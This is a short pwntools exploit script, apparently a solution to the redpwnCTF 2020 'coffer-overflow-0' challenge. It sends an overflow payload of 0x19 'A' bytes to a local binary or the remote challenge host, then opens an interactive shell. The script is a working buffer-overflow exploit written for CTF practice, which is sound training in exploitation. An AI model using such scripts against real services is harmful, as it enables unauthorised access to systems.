from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./coffer-overflow-0"
HOST = "2020.redpwnc.tf"
PORT = 31199 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

def exploit():
	payload = "A"*0x19
	conn.recvline()
	conn.recvline()
	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
